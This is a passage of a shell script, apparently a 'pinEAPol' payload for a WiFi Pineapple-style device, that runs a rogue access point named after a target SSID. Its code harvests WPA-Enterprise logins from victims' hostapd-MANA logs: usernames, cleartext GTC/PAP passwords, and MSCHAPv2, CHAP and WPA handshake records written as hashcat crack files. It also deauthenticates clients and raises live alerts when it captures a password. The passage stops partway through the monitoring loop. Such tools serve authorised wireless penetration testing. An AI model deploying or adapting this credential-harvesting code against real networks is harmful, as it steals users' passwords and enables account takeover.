cleanup_all_stale_parse_staging() {
    local work_dir

    for work_dir in "$LOOT_DIR"/*/work; do
        [ -d "$work_dir" ] || continue
        cleanup_stale_parse_staging "$work_dir"
    done
}

remove_parse_staging() {
    local staging_dir="$1"
    [ -n "$staging_dir" ] && [ -d "$staging_dir" ] || return 0
    rm -rf -- "$staging_dir"
}

parse_credentials() (
    local log_file="$1"
    local output_dir="$2"

    # Build a complete result generation out of sight, then atomically publish
    # each file. Readers therefore see the previous complete generation until
    # its replacement is ready, never a truncated or half-populated file.
    local staging_root="${SESSION_WORK_DIR:-}"
    if [ -z "$staging_root" ]; then
        staging_root="$(dirname "$output_dir")/work"
    fi
    local staging_dir="$staging_root/.parse.$$"
    local identities_file="$staging_dir/identities.txt"
    local cleartext_file="$staging_dir/cleartext.txt"
    local mschapv2_file="$staging_dir/mschapv2_raw.tsv"
    local hashcat_file="$staging_dir/hashcat_5500.txt"
    local hashcat_chap_file="$staging_dir/hashcat_4800.txt"
    local hashcat_wpa_file="$staging_dir/hashcat_22000.txt"
    local debug_hashcat_file="$staging_dir/hashcat_5500.debug"
    local mana_hashes_file="$staging_dir/hashcat_5500.mana"
    local mana_cleartext_file="$staging_dir/mana_cleartext_creds.tsv"
    local mana_mschapv2_file="$staging_dir/mana_mschapv2.tsv"
    local mana_chap_file="$staging_dir/mana_chap.tsv"
    local sessions_file="$staging_dir/eap_sessions.tsv"
    local tls_evidence_file="$staging_dir/tls_evidence.txt"
    local result_name

    # The Pager watchdog can interrupt harvesting. Keep temporary parse output
    # scoped to this subshell so all ordinary exits and catchable signals remove
    # it rather than leaving a hidden work directory behind.
    trap 'remove_parse_staging "$staging_dir"' EXIT HUP INT TERM

    IDENTITY_COUNT=0
    CLEARTEXT_COUNT=0
    MSCHAPV2_COUNT=0
    CHAP_COUNT=0
    WPA2_HASH_COUNT=0
    TLS_EVIDENCE_COUNT=0

    if [ ! -f "$log_file" ]; then
        return 1
    fi

    mkdir -p "$staging_root" || return 1
    cleanup_stale_parse_staging "$staging_root"
    mkdir -p "$staging_dir" || return 1
    rm -f "$staging_dir"/identities.txt "$staging_dir"/cleartext.txt \
        "$staging_dir"/mschapv2_raw.tsv "$staging_dir"/hashcat_5500.txt \
        "$staging_dir"/hashcat_4800.txt "$staging_dir"/hashcat_22000.txt \
        "$staging_dir"/hashcat_5500.debug "$staging_dir"/hashcat_5500.mana \
        "$staging_dir"/mana_cleartext_creds.tsv "$staging_dir"/mana_mschapv2.tsv \
        "$staging_dir"/mana_chap.tsv "$staging_dir"/eap_sessions.tsv \
        "$staging_dir"/tls_evidence.txt

    # --- EAP Identities (usernames) ---
    # Includes outer/phase-2 identities and typical hostapd ASCII dumps.
    {
        extract_eap_identities "$log_file"
        extract_mana_identities "$MANA_CREDOUT"
    } | sort -u > "$identities_file" 2>/dev/null

    IDENTITY_COUNT=$(wc -l < "$identities_file" 2>/dev/null | tr -d ' ')
    [ -z "$IDENTITY_COUNT" ] && IDENTITY_COUNT=0

    # --- Context-qualified GTC/PAP cleartext ---
    {
        printf 'method\tusername\tpassword\n'
        {
            extract_mana_cleartext "$MANA_CREDOUT"
            extract_mana_cleartext_hostapd "$log_file"
        } | sort -u
    } > "$mana_cleartext_file"

    {
        extract_contextual_cleartext "$log_file"
        {
            extract_mana_cleartext "$MANA_CREDOUT"
            extract_mana_cleartext_hostapd "$log_file"
        } | awk -F '\t' '{ print $1 "\t" $2 ":" $3 }'
    } | format_cleartext_records | sort -u > "$cleartext_file" 2>/dev/null

    CLEARTEXT_COUNT=$(wc -l < "$cleartext_file" 2>/dev/null | tr -d ' ')
    [ -z "$CLEARTEXT_COUNT" ] && CLEARTEXT_COUNT=0

    # --- MSCHAPv2 Challenge/Response Hashes ---
    # hostapd debug:
    # Common hostapd labels include Challenge, Peer-Challenge, Name, and
    # NT-Response. Older/custom builds may use auth_challenge, username,
    # peer_challenge, and nt_response instead.
    # Hashcat mode 5500: username::::nt_response:auth_challenge

    local auth_challenge=""
    local peer_challenge=""
    local mschap_user=""
    local nt_response=""
    local pending_field=""
    local pending_length=0

    printf 'username\tauthenticator_challenge\tpeer_challenge\tnt_response\teffective_challenge\n' > "$mschapv2_file"
    : > "$debug_hashcat_file"

    while IFS= read -r line; do
        if [ -n "$pending_field" ]; then
            local pending_hex
            pending_hex=$(compact_hex_payload "$line")
            case "$pending_field" in
                auth)
                    [ ${#pending_hex} -ge 32 ] && auth_challenge=$(printf '%s' "$pending_hex" | cut -c 1-32)
                    ;;
                peer)
                    [ ${#pending_hex} -ge 32 ] && peer_challenge=$(printf '%s' "$pending_hex" | cut -c 1-32)
                    ;;
                nt)
                    [ ${#pending_hex} -ge 48 ] && nt_response=$(printf '%s' "$pending_hex" | cut -c 1-48)
                    ;;
                name)
                    pending_hex=$(hexdump_byte_payload "$line" "$pending_length")
                    if [ ${#pending_hex} -ge 2 ]; then
                        mschap_user=$(hex_to_binary "$pending_hex" 2>/dev/null)
                    fi
                    ;;
            esac
            pending_field=""
            pending_length=0
        fi

        case "$line" in
            *[Mm][Ss][Cc][Hh][Aa][Pp][Vv]2*[Aa]uth*[Cc]hallenge*|*[Mm][Ss][Cc][Hh][Aa][Pp][Vv]2:[[:space:]][Cc]hallenge[[:space:]]-*)
                local auth_hex
                if [ "${line%:}" != "$line" ]; then
                    pending_field="auth"
                else
                    auth_hex=$(compact_hex_payload "$line")
                fi
                if [ ${#auth_hex} -ge 32 ] 2>/dev/null; then
                    auth_challenge=$(printf '%s' "$auth_hex" | cut -c 1-32)
                elif [ -z "$pending_field" ]; then
                    pending_field="auth"
                fi
                ;;
            *[Mm][Ss][Cc][Hh][Aa][Pp][Vv]2*[Pp]eer*[Cc]hallenge*)
                local peer_hex
                if [ "${line%:}" != "$line" ]; then
                    pending_field="peer"
                else
                    peer_hex=$(compact_hex_payload "$line")
                fi
                if [ ${#peer_hex} -ge 32 ] 2>/dev/null; then
                    peer_challenge=$(printf '%s' "$peer_hex" | cut -c 1-32)
                elif [ -z "$pending_field" ]; then
                    pending_field="peer"
                fi
                ;;
            *[Mm][Ss][Cc][Hh][Aa][Pp][Vv]2*[Uu]sername*)
                mschap_user=$(echo "$line" | sed "s/.*[Uu]sername[= ]*['\"]*//" | sed "s/['\"].*//" | tr -d ' ')
                ;;
            *[Mm][Ss][Cc][Hh][Aa][Pp][Vv]2*[Nn]ame*hexdump*)
                local name_hex
                local name_length
                name_length=$(printf '%s\n' "$line" | sed -n 's/.*len=\([0-9][0-9]*\).*/\1/p')
                [ -n "$name_length" ] || name_length=0
                if [ "${line%:}" != "$line" ]; then
                    pending_field="name"
                    pending_length="$name_length"
                else
                    name_hex=$(hexdump_byte_payload "${line##*: }" "$name_length")
                fi
                if [ ${#name_hex} -ge 2 ] 2>/dev/null; then
                    mschap_user=$(hex_to_binary "$name_hex" 2>/dev/null)
                elif [ -z "$pending_field" ]; then
                    pending_field="name"
                fi
                ;;
            *[Mm][Ss][Cc][Hh][Aa][Pp][Vv]2*[Nn][Tt]_*[Rr]esponse*|*[Mm][Ss][Cc][Hh][Aa][Pp][Vv]2*[Nn][Tt]\ *[Rr]esponse*|*[Mm][Ss][Cc][Hh][Aa][Pp][Vv]2*[Nn][Tt]-[Rr]esponse*)
                local nt_hex
                if [ "${line%:}" != "$line" ]; then
                    pending_field="nt"
                else
                    nt_hex=$(compact_hex_payload "$line")
                fi
                if [ ${#nt_hex} -ge 48 ] 2>/dev/null; then
                    nt_response=$(printf '%s' "$nt_hex" | cut -c 1-48)
                elif [ -z "$pending_field" ]; then
                    pending_field="nt"
                fi
                ;;
        esac

        # The fields are not emitted until all four components are present,
        # regardless of the order used by this hostapd debug build.
        if [ -n "$mschap_user" ] && [ -n "$nt_response" ] && \
           [ -n "$auth_challenge" ] && [ -n "$peer_challenge" ]; then
            local effective_challenge
            effective_challenge=$(derive_mschapv2_challenge "$peer_challenge" "$auth_challenge" "$mschap_user")
            printf '%s\t%s\t%s\t%s\t%s\n' "$mschap_user" "$auth_challenge" \
                "$peer_challenge" "$nt_response" "$effective_challenge" >> "$mschapv2_file"
            if [ ${#effective_challenge} -eq 16 ]; then
                echo "${mschap_user}::::${nt_response}:${effective_challenge}" >> "$debug_hashcat_file"
            fi
            auth_challenge=""
            peer_challenge=""
            mschap_user=""
            nt_response=""
        fi
    done < "$log_file"

    if [ -s "$mschapv2_file" ]; then
        { sed -n '1p' "$mschapv2_file"; sed -n '2,$p' "$mschapv2_file" | sort -u; } > "$mschapv2_file.sorted"
        mv "$mschapv2_file.sorted" "$mschapv2_file"
    fi
    # Prefer MANA's already-derived records, including its immediate stdout
    # stream when mana_credout has not flushed yet. Retain a debug-derived record
    # only when MANA has no record with the same NT response.
    {
        extract_mana_hashcat_5500 "$MANA_CREDOUT"
        extract_mana_hashcat_hostapd "$log_file"
    } | sort -u > "$mana_hashes_file"

    awk '
        FILENAME == ARGV[1] {
            marker = index($0, "::::")
            remainder = substr($0, marker + 4)
            separator = index(remainder, ":")
            response = substr(remainder, 1, separator - 1)
            authoritative[response] = 1
            print
            next
        }
        {
            marker = index($0, "::::")
            remainder = substr($0, marker + 4)
            separator = index(remainder, ":")
            response = substr(remainder, 1, separator - 1)
            if (!authoritative[response]) print
        }
    ' "$mana_hashes_file" "$debug_hashcat_file" | sort -u > "$hashcat_file"

    {
        printf 'username\tnt_response\teffective_challenge\n'
        cat "$mana_hashes_file" | awk '
            {
                marker = index($0, "::::")
                user = substr($0, 1, marker - 1)
                remainder = substr($0, marker + 4)
                separator = index(remainder, ":")
                print user "\t" substr(remainder, 1, separator - 1) "\t" \
                    substr(remainder, separator + 1)
            }
        '
    } > "$mana_mschapv2_file"

    {
        printf 'method\tusername\thash\tsalt\tid\n'
        {
            extract_mana_chap "$MANA_CREDOUT"
            extract_mana_chap_hostapd "$log_file"
        } | sort -u
    } > "$mana_chap_file"

    sed '1d' "$mana_chap_file" | chap_records_to_hashcat_4800 | sort -u > "$hashcat_chap_file"
    extract_mana_hashcat_22000_hostapd "$log_file" | sort -u > "$hashcat_wpa_file"

    MSCHAPV2_COUNT=$(wc -l < "$hashcat_file" 2>/dev/null | tr -d ' ')
    [ -z "$MSCHAPV2_COUNT" ] && MSCHAPV2_COUNT=0
    CHAP_COUNT=$(sed '1d' "$mana_chap_file" 2>/dev/null | sed '/^$/d' | wc -l | tr -d ' ')
    [ -z "$CHAP_COUNT" ] && CHAP_COUNT=0
    WPA2_HASH_COUNT=$(wc -l < "$hashcat_wpa_file" 2>/dev/null | tr -d ' ')
    [ -z "$WPA2_HASH_COUNT" ] && WPA2_HASH_COUNT=0

    extract_tls_evidence "$log_file" | sort -u > "$tls_evidence_file"
    TLS_EVIDENCE_COUNT=$(wc -l < "$tls_evidence_file" 2>/dev/null | tr -d ' ')
    [ -z "$TLS_EVIDENCE_COUNT" ] && TLS_EVIDENCE_COUNT=0

    parse_eap_sessions "$log_file" "$sessions_file"

    for result_name in cleartext.txt hashcat_5500.txt hashcat_4800.txt hashcat_22000.txt; do
        if [ -s "$staging_dir/$result_name" ]; then
            chmod 600 "$staging_dir/$result_name" 2>/dev/null
            if ! mv "$staging_dir/$result_name" "$output_dir/$result_name"; then
                remove_parse_staging "$staging_dir"
                return 1
            fi
        else
            rm -f "$output_dir/$result_name"
        fi
    done
    rm -f "$identities_file" "$mschapv2_file" "$debug_hashcat_file" \
        "$mana_hashes_file" "$mana_cleartext_file" "$mana_mschapv2_file" \
        "$mana_chap_file" "$sessions_file" "$tls_evidence_file"
    remove_parse_staging "$staging_dir"

    return 0
)

# ============================================
# LIVE MONITORING
# ============================================

detect_outer_eap_method() {
    local log_file="$1"
    [ -f "$log_file" ] || return 0

    awk '
        /EAP Response-PEAP/ { print "PEAP"; exit }
        /EAP Response-TTLS/ { print "TTLS"; exit }
        /EAP Response-FAST/ { print "FAST"; exit }
        /EAP Response-TLS/ { print "EAP-TLS"; exit }
        /EAP Response-MD5/ { print "EAP-MD5"; exit }
        /EAP Response-MSCHAPV2/ { print "EAP-MSCHAPv2"; exit }
        /EAP Response-GTC|EAP-GTC/ { print "EAP-GTC"; exit }
    ' "$log_file"
}

detect_inner_eap_method() {
    local log_file="$1"
    [ -f "$log_file" ] || return 0

    awk '
        /TTLS[-\/]PAP/ { print "PAP"; exit }
        /TTLS[-\/]CHAP/ { print "CHAP"; exit }
        /TTLS[-\/]MSCHAPV2/ { print "MSCHAPv2"; exit }
        /TTLS[-\/]MSCHAP/ { print "MSCHAPv1"; exit }
        /[Pp]hase 2.*EAP-MSCHAPV2|[Pp]hase 2.*MSCHAPV2/ { print "MSCHAPv2"; exit }
        /[Pp]hase 2.*EAP-MD5/ { print "EAP-MD5"; exit }
        /[Pp]hase 2.*EAP-GTC|[Pp]hase 2.*[^A-Za-z]GTC[^A-Za-z]/ { print "EAP-GTC"; exit }
    ' "$log_file"
}

eap_negotiation_label() {
    local outer_method="$1"
    local inner_method="$2"

    if [ -n "$outer_method" ] && [ -n "$inner_method" ]; then
        printf '%s -> %s' "$outer_method" "$inner_method"
    elif [ -n "$outer_method" ]; then
        printf '%s' "$outer_method"
    else
        printf '%s' "not established"
    fi
}

live_event_stream() {
    local log_file="$1"
    [ -f "$log_file" ] || return 0

    awk '
        function station_mac(    i, value) {
            for (i = 1; i <= NF; i++) {
                value = $i
                gsub(/^[^0-9A-Fa-f]*/, "", value)
                gsub(/[^0-9A-Fa-f:].*$/, "", value)
                if (value ~ /^[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]$/)
                    return tolower(value)
            }
            return ""
        }
        /IEEE 802\.11: associated \(aid/ { print "ASSOCIATED\t" station_mac() }
        /CTRL-EVENT-EAP-STARTED/ { print "EAP_STARTED" }
        /CTRL-EVENT-EAP-PROPOSED-METHOD/ {
            method = $0
            sub(/.*method=/, "", method)
            if (method == "1") method = "Identity"
            else if (method == "4") method = "EAP-MD5"
            else if (method == "6") method = "EAP-GTC"
            else if (method == "13") method = "EAP-TLS"
            else if (method == "21") method = "EAP-TTLS"
            else if (method == "25") method = "EAP-PEAP"
            else if (method == "26") method = "EAP-MSCHAPv2"
            else if (method == "43") method = "EAP-FAST"
            else method = "type " method
            print "PROPOSED\t" method
        }
        /EAP Response-Identity/ { print "IDENTITY" }
        /EAP entering state NAK|EAP Response-NAK/ { print "NAK" }
        /EAP Response-PEAP/ { outer = "PEAP"; print "OUTER\t" outer }
        /EAP Response-TTLS/ { outer = "TTLS"; print "OUTER\t" outer }
        /EAP Response-FAST/ { outer = "FAST"; print "OUTER\t" outer }
        /EAP Response-TLS/ { outer = "EAP-TLS"; print "OUTER\t" outer }
        /EAP Response-MD5/ { outer = "EAP-MD5"; print "OUTER\t" outer }
        /EAP Response-MSCHAPV2/ { outer = "EAP-MSCHAPv2"; print "OUTER\t" outer }
        /EAP Response-GTC/ { outer = "EAP-GTC"; print "OUTER\t" outer }
        /TTLS[-\/]PAP/ { print "INNER\tPAP" }
        /TTLS[-\/]CHAP/ { print "INNER\tCHAP" }
        /TTLS[-\/]MSCHAPV2/ { print "INNER\tMSCHAPv2" }
        /TTLS[-\/]MSCHAP([^V]|$)/ { print "INNER\tMSCHAPv1" }
        /[Pp]hase 2.*EAP-MSCHAPV2|[Pp]hase 2.*MSCHAPV2/ { print "INNER\tMSCHAPv2" }
        /[Pp]hase 2.*EAP-MD5/ { print "INNER\tEAP-MD5" }
        /[Pp]hase 2.*EAP-GTC/ { print "INNER\tEAP-GTC" }
        /MANA EAP (TTLS-)?MD5 HASHCAT user=.* \| / {
            if (outer == "TTLS" || outer == "PEAP" || outer == "FAST") print "INNER\tEAP-MD5"
            print "CHAP"
        }
        /MANA EAP .* HASHCAT \| / {
            # TTLS-MSCHAP(v2) is already identified by its method-specific
            # rules above. Only a literal EAP-MSCHAPv2 record denotes the EAP
            # inner method; otherwise do not overwrite the precise label.
            if ($0 ~ /MANA EAP EAP-MSCHAPV2 HASHCAT/ && \
                (outer == "TTLS" || outer == "PEAP" || outer == "FAST")) print "INNER\tEAP-MSCHAPv2"
            print "MSCHAPV2"
        }
        /MANA EAP .* \| / && $0 !~ /(ASLEAP|JTR|HASHCAT)/ {
            line = $0
            sub(/.*MANA EAP /, "", line)
            method = line
            sub(/ \|.*/, "", method)
            if (method ~ /GTC/) print "CLEAR\tEAP-GTC"
            else if (method ~ /PAP/) print "CLEAR\tPAP"
        }
        /CTRL-EVENT-EAP-SUCCESS/ { print "SUCCESS" }
        /CTRL-EVENT-EAP-FAILURE/ { print "FAILURE" }
        /AP-STA-CONNECTED/ { print "CONNECTED\t" tolower($NF) }
        /AP-STA-DISCONNECTED/ { print "DISCONNECTED\t" tolower($NF) }
    ' "$log_file"
}

deauthorize_connected_station() {
    local station="$1"
    case "$station" in
        [0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]) ;;
        *) return 1 ;;
    esac

    # MANA can accept some PAP/GTC paths after recording them. Ask hostapd,
    # which owns this AP station table, to send the deauthentication frame and
    # remove this client; `iw station del` does not reliably do this for APs.
    hostapd_cli -p "$HOSTAPD_CTRL_DIR" -i "$PINEAPOL_IFACE" \
        deauthenticate "$station" 3 >/dev/null 2>> "${SESSION_LOG:-/dev/null}"
}

log_eap_failure_diagnostics() {
    local failure_number="$1"
    local negotiation="$2"
    # A monitor delta can hold multiple client attempts. Do not infer a reason
    # from adjacent teardown text and attribute another attempt's method to this
    # one. The complete hostapd log remains available for diagnosis.
    logboth red "EAP failure #$failure_number: authentication exchange failed ($negotiation)"
}

live_monitor() {
    LOG ""
    logboth green "=== pinEAPol ACTIVE ==="
    logboth green "Rogue AP: $TARGET_SSID"
    logboth green "Channel: $TARGET_CHANNEL"
    LOG ""
    LOG yellow "Press button to stop"
    LOG ""

    led_deploy

    local last_log_size=0
    local loop_count=0
    local seen_identities=""
    local seen_mschap_hashes=""
    local seen_cleartext_records=""
    local seen_chap_records=""
    local seen_wpa_hashes=""
    local seen_tls_evidence=""
    local failure_count=0
    local success_count=0
    local pending_no_material_success=0
    local nak_count=0
    local association_count=0
    local disassociation_count=0
    local observed_outer_method=""
    local observed_inner_method=""
    local partial_log_line=""
    local pending_mschap_notice=0
    local pending_chap_notice=0
    local pending_cleartext_notice=0
    local pending_mschap_since=0
    local pending_chap_since=0
    local pending_cleartext_since=0

    while true; do
        # Check for stop
        if check_for_stop; then
            logboth yellow "Stop requested"
            break
        fi

        loop_count=$((loop_count + 1))

        # Examine the growing log on every half-second UI cycle. Keep an
        # unfinished final line in memory until hostapd terminates it, so each
        # complete log line is processed exactly once and in source order.
        if [ -f "$HOSTAPD_LOG" ]; then
            local current_size
            current_size=$(wc -c < "$HOSTAPD_LOG" 2>/dev/null | tr -d ' ')
            [ -z "$current_size" ] && current_size=0

            if [ "$current_size" -lt "$last_log_size" ]; then
                last_log_size=0
            fi

            if [ "$current_size" -gt "$last_log_size" ]; then
                local delta_start=$((last_log_size + 1))
                local delta_file="$SESSION_WORK_DIR/live-hostapd.delta"
                local raw_delta_file="$SESSION_WORK_DIR/live-hostapd.raw"
                tail -c "+$delta_start" "$HOSTAPD_LOG" > "$raw_delta_file" 2>/dev/null
                last_log_size="$current_size"

                if [ -n "$partial_log_line" ]; then
                    {
                        printf '%s' "$partial_log_line"
                        cat "$raw_delta_file"
                    } > "$delta_file"
                else
                    cp "$raw_delta_file" "$delta_file"
                fi

                local final_byte
                final_byte=$(tail -c 1 "$delta_file" 2>/dev/null | od -An -tu1 | tr -d ' ')
                if [ -s "$delta_file" ] && [ "$final_byte" != "10" ]; then
                    partial_log_line=$(tail -n 1 "$delta_file")
                    sed '$d' "$delta_file" > "$delta_file.complete"
                    mv "$delta_file.complete" "$delta_file"
                else
                    partial_log_line=""
                fi

                # Parse identities from the delta. The overlap and in-memory set
                # keep result counters independent of the display event stream.
                local parsed_identities
                local new_identity_count=0
                parsed_identities=$(extract_eap_identities "$delta_file" | sort -u)
                while IFS= read -r new_id; do
                    [ -z "$new_id" ] && continue
                    if ! printf '%s\n' "$seen_identities" | grep -Fxq "$new_id"; then
                        if [ -z "$seen_identities" ]; then
                            seen_identities="$new_id"
                        else
                            seen_identities="$seen_identities
$new_id"
                        fi
                        new_identity_count=$((new_identity_count + 1))
                    fi
                done <<< "$parsed_identities"

                IDENTITY_COUNT=$(printf '%s\n' "$seen_identities" | sed '/^$/d' | wc -l | tr -d ' ')
                [ -z "$IDENTITY_COUNT" ] && IDENTITY_COUNT=0

                # MANA prints a complete, already-derived Hashcat record before
                # attempting password verification. Detect those exact records
                # directly instead of invoking the expensive fallback parser.
                local parsed_hashes
                local new_hash_count=0
                local new_hash
                parsed_hashes=$(extract_mana_hashcat_hostapd "$delta_file" | sort -u)
                while IFS= read -r new_hash; do
                    [ -n "$new_hash" ] || continue
                    if ! printf '%s\n' "$seen_mschap_hashes" | grep -Fxq "$new_hash"; then
                        if [ -z "$seen_mschap_hashes" ]; then
                            seen_mschap_hashes="$new_hash"
                        else
                            seen_mschap_hashes="$seen_mschap_hashes
$new_hash"
                        fi
                        new_hash_count=$((new_hash_count + 1))
                    fi
                done <<< "$parsed_hashes"

                if [ "$new_hash_count" -gt 0 ]; then
                    publish_unique_lines_atomic "$SESSION_RESULTS_DIR/hashcat_5500.txt" "$seen_mschap_hashes"
                    MSCHAPV2_COUNT=$(printf '%s\n' "$seen_mschap_hashes" | sed '/^$/d' | sort -u | wc -l | tr -d ' ')
                    pending_mschap_notice=$((pending_mschap_notice + new_hash_count))
                    [ "$pending_mschap_since" -gt 0 ] || pending_mschap_since="$loop_count"
                fi

                # MD5 and the TTLS legacy CHAP variants use a different MANA
                # record format from MSCHAPv2. Keep their normalized records in
                # the session results as soon as hostapd prints them.
                local parsed_chap
                local new_chap_count=0
                local chap_record
                parsed_chap=$(extract_mana_chap_hostapd "$delta_file" | sort -u)
                while IFS= read -r chap_record; do
                    [ -n "$chap_record" ] || continue
                    if ! printf '%s\n' "$seen_chap_records" | grep -Fxq "$chap_record"; then
                        if [ -z "$seen_chap_records" ]; then
                            seen_chap_records="$chap_record"
                        else
                            seen_chap_records="$seen_chap_records
$chap_record"
                        fi
                        new_chap_count=$((new_chap_count + 1))
                    fi
                done <<< "$parsed_chap"

                if [ "$new_chap_count" -gt 0 ]; then
                    local live_hashcat_chap
                    live_hashcat_chap=$(printf '%s\n' "$seen_chap_records" | chap_records_to_hashcat_4800)
                    publish_unique_lines_atomic "$SESSION_RESULTS_DIR/hashcat_4800.txt" "$live_hashcat_chap"
                    CHAP_COUNT=$(printf '%s\n' "$seen_chap_records" | sed '/^$/d' | sort -u | wc -l | tr -d ' ')
                    pending_chap_notice=$((pending_chap_notice + new_chap_count))
                    [ "$pending_chap_since" -gt 0 ] || pending_chap_since="$loop_count"
                fi

                # A completed WPA-EAP connection can yield a native Hashcat
                # 22000 WPA record. Preserve it as soon as MANA writes it.
                local parsed_wpa_hashes
                local new_wpa_hash_count=0
                local new_wpa_hash
                parsed_wpa_hashes=$(extract_mana_hashcat_22000_hostapd "$delta_file" | sort -u)
                while IFS= read -r new_wpa_hash; do
                    [ -n "$new_wpa_hash" ] || continue
                    if ! printf '%s\n' "$seen_wpa_hashes" | grep -Fxq "$new_wpa_hash"; then
                        if [ -z "$seen_wpa_hashes" ]; then
                            seen_wpa_hashes="$new_wpa_hash"
                        else
                            seen_wpa_hashes="$seen_wpa_hashes
$new_wpa_hash"
                        fi
                        new_wpa_hash_count=$((new_wpa_hash_count + 1))
                    fi
                done <<< "$parsed_wpa_hashes"
                if [ "$new_wpa_hash_count" -gt 0 ]; then
                    publish_unique_lines_atomic "$SESSION_RESULTS_DIR/hashcat_22000.txt" "$seen_wpa_hashes"
                    WPA2_HASH_COUNT=$(printf '%s\n' "$seen_wpa_hashes" | sed '/^$/d' | sort -u | wc -l | tr -d ' ')
                fi

                # Consume both the immediate MANA output and the credential
                # file. The former is the primary live path; the latter covers
                # builds that do not flush their stdout plaintext callback.
                local parsed_cleartext
                local new_cleartext_count=0
                local cleartext_record
                parsed_cleartext=$(
                    {
                        extract_mana_cleartext_hostapd "$delta_file"
                        extract_mana_cleartext "$MANA_CREDOUT"
                    } | sort -u
                )
                while IFS= read -r cleartext_record; do
                    [ -n "$cleartext_record" ] || continue
                    if ! printf '%s\n' "$seen_cleartext_records" | grep -Fxq "$cleartext_record"; then
                        if [ -z "$seen_cleartext_records" ]; then
                            seen_cleartext_records="$cleartext_record"
                        else
                            seen_cleartext_records="$seen_cleartext_records
$cleartext_record"
                        fi
                        new_cleartext_count=$((new_cleartext_count + 1))
                    fi
                done <<< "$parsed_cleartext"

                if [ "$new_cleartext_count" -gt 0 ]; then
                    local live_cleartext
                    live_cleartext=$(printf '%s\n' "$seen_cleartext_records" | \
                        awk -F '\t' 'NF >= 3 { print $1 "\t" $2 ":" $3 }' | \
                        format_cleartext_records)
                    publish_unique_lines_atomic "$SESSION_RESULTS_DIR/cleartext.txt" "$live_cleartext"
                    CLEARTEXT_COUNT=$(printf '%s\n' "$live_cleartext" | sed '/^$/d' | wc -l | tr -d ' ')
                    pending_cleartext_notice=$((pending_cleartext_notice + new_cleartext_count))
                    [ "$pending_cleartext_since" -gt 0 ] || pending_cleartext_since="$loop_count"
                fi

                local parsed_tls_evidence
                local tls_evidence_line
                parsed_tls_evidence=$(extract_tls_evidence "$delta_file" | sort -u)
                while IFS= read -r tls_evidence_line; do
                    [ -n "$tls_evidence_line" ] || continue
                    if ! printf '%s\n' "$seen_tls_evidence" | grep -Fxq "$tls_evidence_line"; then
                        if [ -z "$seen_tls_evidence" ]; then
                            seen_tls_evidence="$tls_evidence_line"
                        else
                            seen_tls_evidence="$seen_tls_evidence
$tls_evidence_line"
                        fi
                    fi
                done <<< "$parsed_tls_evidence"
                TLS_EVIDENCE_COUNT=$(printf '%s\n' "$seen_tls_evidence" | sed '/^$/d' | sort -u | wc -l | tr -d ' ')
                [ -z "$TLS_EVIDENCE_COUNT" ] && TLS_EVIDENCE_COUNT=0

                # Emit one display event at a time, in the exact order that
                # hostapd wrote the completed log lines. Result parsing above
                # deliberately remains separate so it can retain its strict
                # record validation and atomic publication behaviour.
                local event_type event_detail negotiation
                while IFS=$'\t' read -r event_type event_detail; do
                    case "$event_type" in
                        ASSOCIATED)
                            logboth blue "Client associated; starting EAP"
                            ;;
                        EAP_STARTED)
                            observed_outer_method=""
                            observed_inner_method=""
                            logboth blue "EAP authentication started"
                            ;;
                        PROPOSED)
                            logboth blue "EAP method proposed: $event_detail"
                            ;;
                        IDENTITY)
                            if [ "$new_identity_count" -gt 0 ]; then
                                logboth green "EAP identity received (redacted)"
                                new_identity_count=$((new_identity_count - 1))
                                VIBRATE
                                play_capture
                            fi
                            ;;
                        OUTER)
                            if [ -n "$event_detail" ] && [ "$event_detail" != "$observed_outer_method" ]; then
                                observed_outer_method="$event_detail"
                                negotiation=$(eap_negotiation_label "$observed_outer_method" "$observed_inner_method")
                                logboth blue "EAP negotiation: $negotiation"
                            fi
                            ;;
                        INNER)
                            if [ -n "$event_detail" ] && [ "$event_detail" != "$observed_inner_method" ]; then
                                observed_inner_method="$event_detail"
                                negotiation=$(eap_negotiation_label "$observed_outer_method" "$observed_inner_method")
                                logboth blue "EAP negotiation: $negotiation"
                            fi
                            ;;
                        NAK)
                            nak_count=$((nak_count + 1))
                            negotiation=$(eap_negotiation_label "$observed_outer_method" "$observed_inner_method")
                            logboth yellow "Client rejected an EAP method (NAK; $negotiation)"
                            ;;
                        MSCHAPV2)
                            if [ "$pending_mschap_notice" -gt 0 ]; then
                                logboth yellow "Complete MSCHAPv2 response captured!"
                                pending_mschap_notice=$((pending_mschap_notice - 1))
                                [ "$pending_mschap_notice" -gt 0 ] || pending_mschap_since=0
                                pending_no_material_success=0
                                VIBRATE
                                play_capture
                            fi
                            ;;
                        CHAP)
                            if [ "$pending_chap_notice" -gt 0 ]; then
                                logboth yellow "Legacy MD5/CHAP response captured!"
                                pending_chap_notice=$((pending_chap_notice - 1))
                                [ "$pending_chap_notice" -gt 0 ] || pending_chap_since=0
                                pending_no_material_success=0
                                VIBRATE
                                play_capture
                            fi
                            ;;
                        CLEAR)
                            if [ -n "$event_detail" ] && [ "$event_detail" != "$observed_inner_method" ]; then
                                observed_inner_method="$event_detail"
                                negotiation=$(eap_negotiation_label "$observed_outer_method" "$observed_inner_method")
                                logboth blue "EAP negotiation: $negotiation"
                            fi
                            if [ "$pending_cleartext_notice" -gt 0 ]; then
                                logboth green "CLEARTEXT PASSWORD CAPTURED!"
                                pending_cleartext_notice=$((pending_cleartext_notice - 1))
                                [ "$pending_cleartext_notice" -gt 0 ] || pending_cleartext_since=0
                                pending_no_material_success=0
                                VIBRATE
                                VIBRATE
                                play_capture
                            fi
                            ;;
                        SUCCESS)
                            success_count=$((success_count + 1))
                            negotiation=$(eap_negotiation_label "$observed_outer_method" "$observed_inner_method")
                            logboth green "EAP authentication succeeded ($negotiation)"
                            if [ "$observed_outer_method" = "EAP-TLS" ]; then
                                logboth yellow "No password material expected: EAP-TLS certificate authentication"
                            elif [ "$CLEARTEXT_COUNT" -eq 0 ] && [ "$MSCHAPV2_COUNT" -eq 0 ] && [ "$CHAP_COUNT" -eq 0 ]; then
                                pending_no_material_success="$loop_count"
                            fi
                            VIBRATE
                            play_capture
                            ;;
                        FAILURE)
                            failure_count=$((failure_count + 1))
